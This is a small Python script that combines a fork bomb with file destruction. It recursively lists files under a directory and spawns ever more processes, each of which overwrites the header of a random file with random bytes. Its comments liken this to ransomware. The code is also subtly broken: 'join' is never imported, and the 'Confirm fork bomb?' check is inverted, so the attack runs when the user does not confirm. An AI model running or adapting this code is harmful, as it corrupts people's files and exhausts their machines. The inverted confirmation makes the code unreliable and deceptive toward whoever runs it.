import os
import random
import glob

def scan(directory):
    #Simple function originally much more complicated
    targets = glob.glob(join(directory,"/**/*"), recursive=True)
    fileTargets = [f for f in targets if os.path.isfile(f)]
    return fileTargets

def scramble(file):
    #In real ransomware this would be replaced by some type of encryption
    #instead of just randomly breaking the header
    try:
        with open(file, "rb+") as f:
            f.write(os.urandom(16))
    except Exception as e:
        pass

def bomb():
    global targets
    scramble(random.choice(targets))

def split():
    child1 = os.fork()
    if child1 == 0:
        bomb()
        split()
    child2 = os.fork()
    if child2 == 0:
        bomb()
        split()

def createBombers(directory):
    #This is the main function that starts all the problems
    try:
        pid = os.fork()
        if pid == 0:
            bomb()
            split()
        else:
            #What the parent proccess should do
            pass
    except:
        #Doesn't matter lets keep going
        pass

if __name__ == "__main__" and not input("Confirm fork bomb? [y/n]:").lower() == 'y':
    #One last saftey before bombing
    targetDirectory = "/your/path/goes/here"
    targets = scan(targetDirectory)
    createBombers(targetDirectory)
